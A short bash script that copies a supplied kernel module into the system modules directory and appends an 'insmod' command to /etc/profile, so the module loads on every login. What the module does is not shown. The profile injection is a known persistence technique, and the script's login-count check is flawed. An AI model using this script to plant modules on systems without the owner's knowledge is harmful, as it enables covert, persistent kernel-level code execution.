#!/usr/bin/bash
#
#  Shell script that will inject module into profile script
# 
#  Usage:
#      bash inject_ksm.sh module.ko.path 
#
#
#   Author:  Hrvoje Novosel<hrvojedotnovosel@gmail.com>
#   Created: 1. July 2017
#
#

if [ "$#" -ne 1 ] || [ ! -f "$1" ]; then
	echo "Usage:"
	echo "./inject_ksm.sh module.ko.path"
	exit 1
fi

if [ "$EUID" -ne 0 ]; then
	echo "Script must be executed under privileged user"
	exit 1
fi

MODULE_NAME=$(basename $1)
MODULES_PATH=/usr/lib/modules/$(uname -r)/

# copy module to safe location?
if [ -d $MODULES_PATH"extra" ]; then
	MODULES_PATH=$MODULES_PATH"extra"
elif [ -d $MODULES_PATH"kernel" ]; then
	if [[ ! -d $MODULES_PATH"kernel/misc" ]]; then
		mkdir $MODULES_PATH"kernel/misc"
	fi
	MODULES_PATH=$MODULES_PATH"kernel/misc"
else
	echo "Cannot find modules path, giving up ..."
	exit 1
fi

cp $1 $MODULES_PATH"/"

# inject module insert command into profile script
if [ -f /etc/profile ]; then

	if [[ $(cat /etc/profile | grep "insmod" | wc -l) = *0* ]]; then
		echo "insmod "$MODULES_PATH"/"$MODULE_NAME" " >> /etc/profile
	fi

else
	echo "Cannot find sutible injection script, giving up ..."
	exit 1
fi

